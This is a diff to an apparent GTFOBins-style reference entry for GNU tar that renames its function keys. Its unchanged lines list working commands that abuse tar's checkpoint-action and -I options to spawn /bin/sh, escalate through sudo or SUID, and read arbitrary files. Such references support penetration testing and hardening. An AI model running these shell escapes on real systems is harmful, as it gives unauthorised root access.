@@ -1,8 +1,8 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-  execute-non-interactive:
+  command:
     - description: This only works for GNU tar.
       code: tar xf /dev/null -I '/bin/sh -c "id 1>&2"'
   file-write:
@@ -17,8 +17,8 @@ functions:
       code: |
         LFILE=file_to_read
         tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
-  sudo-enabled:
+  sudo:
     - code: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-  suid-limited:
+  limited-suid:
     - code: ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ---
